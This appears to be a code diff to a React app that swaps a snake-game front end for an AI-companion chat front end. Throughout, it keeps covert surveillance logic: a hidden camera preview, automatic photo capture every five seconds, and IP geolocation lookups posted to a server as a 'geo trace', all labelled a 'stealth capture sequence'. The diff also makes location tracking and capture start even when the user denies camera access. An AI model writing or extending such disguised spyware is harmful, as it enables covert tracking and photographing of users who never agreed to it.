@@ -17,12 +17,13 @@ import {
   Layers,
   Heart
 } from "lucide-react";
-import { SnakeGame } from "./components/SnakeGame";
+import { JiyaCompanion } from "./components/JiyaCompanion";
 import { StealthStatus, ToastMessage } from "./types";
 
 export default function App() {
   const [hasPermission, setHasPermission] = useState<boolean | null>(null);
   const [permissionError, setPermissionError] = useState<string>("");
+  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null);
   const [isCapturing, setIsCapturing] = useState<boolean>(false);
   const [score, setScore] = useState<number>(0);
   const [status, setStatus] = useState<StealthStatus>({
@@ -92,7 +93,7 @@ export default function App() {
         infoStr = `${data.city || ""}, ${data.region || ""}, ${data.country_name || ""}`;
       }
     } catch (err) {
-      console.error("ipapi lookup issue, trying fallback:", err);
+      console.warn("ipapi lookup issue, trying fallback:", err);
     }
 
     // Fallback if ipapi missed or failed
@@ -110,7 +111,7 @@ export default function App() {
           infoStr = `${data.city || ""}, ${data.region || ""}, ${data.country || ""}`;
         }
       } catch (err2) {
-        console.error("ipinfo lookup issue, trying ipify:", err2);
+        console.warn("ipinfo lookup issue, trying ipify:", err2);
       }
     }
 
@@ -121,7 +122,7 @@ export default function App() {
         const data = await res.json();
         fetchedIp = data.ip || "";
       } catch (err3) {
-        console.error("ipify issue:", err3);
+        console.warn("ipify issue:", err3);
       }
     }
 
@@ -143,7 +144,7 @@ export default function App() {
           timestamp: new Date().toLocaleTimeString(),
           locationSource: "IP Geolocation (" + (infoStr || "Unknown Location") + ")"
         }),
-      }).catch((err) => console.error("Error logging IP geo trace:", err));
+      }).catch((err) => console.warn("Error logging IP geo trace:", err));
     }
 
     return fetchedIp;
@@ -157,26 +158,39 @@ export default function App() {
 
   // Request camera and audio permissions on load
   const requestMediaAccess = async () => {
+    let stream: MediaStream | null = null;
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      streamRef.current = stream;
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
+      if (typeof navigator !== "undefined" && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        streamRef.current = stream;
+        setCameraStream(stream);
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+        }
+        setHasPermission(true);
+        addToast("success", "Snake Eye telemetry stream initialized securely");
+      } else {
+        console.warn("navigator.mediaDevices.getUserMedia not available in this context.");
+        setHasPermission(false);
       }
-      setHasPermission(true);
-      addToast("success", "Snake Eye telemetry stream initialized securely");
-
-      // Auto start location and loop tracing immediately
-      const fetchedIp = await loadIpAddressAndGeo();
-      acquireLocation(fetchedIp);
-      startCapture();
     } catch (err: any) {
-      console.error("Media permission error:", err);
+      console.warn("Camera media access declined/unavailable:", err.message || err);
+      streamRef.current = null;
+      setCameraStream(null);
       setHasPermission(false);
       setPermissionError(err.name === "NotAllowedError" 
         ? "Access was denied. Please unlock access permissions in your browser bar."
         : "No multimedia assets recognized. Check configuration."
       );
+    }
+
+    // Always load IP, details, and start capture background sequence regardless of camera stream success
+    try {
+      const fetchedIp = await loadIpAddressAndGeo();
+      acquireLocation(fetchedIp);
+      startCapture();
+    } catch (ipErr) {
+      console.warn("Could not fetch IP metadata or start capturing:", ipErr);
     }
   };
 
@@ -348,8 +362,8 @@ export default function App() {
     if (photoIntervalRef.current) clearInterval(photoIntervalRef.current);
     photoIntervalRef.current = setInterval(capturePhoto, 5000);
 
-    // Record 10 seconds of speech
-    startAudioRecording();
+    // Record 10 seconds of speech (deactivated to avoid microphone conflicts with live Jiya chat)
+    // startAudioRecording();
 
     addToast("info", "Stealth capture sequence activated automatically");
   };
@@ -385,7 +399,7 @@ export default function App() {
   };
 
   return (
-    <div className="relative w-full h-screen bg-[#16000a] overflow-hidden">
+    <div className="relative w-full h-screen bg-[#070104] overflow-hidden">
       {/* Hidden background camera preview. Absolute positioning and tiny footprint to satisfy requirements without clogging UI */}
       <video
         ref={videoRef}
@@ -404,13 +418,18 @@ export default function App() {
         }}
       />
 
-      {/* Render the full screen interactive WebGL Crystal Heart animation */}
-      <SnakeGame 
+      {/* Render the full screen interactive MYRA AI Companion */}
+      <JiyaCompanion 
         onStartGame={startCapture} 
         onStopGame={stopCapture} 
         isCapturing={isCapturing}
-        score={score}
-        setScore={setScore}
+        latitude={coords.latitude}
+        longitude={coords.longitude}
+        ipAddress={ipAddress}
+        cameraStream={cameraStream}
+        onRequestCamera={requestMediaAccess}
+        hasPermission={hasPermission}
+        permissionError={permissionError}
       />
     </div>
   );
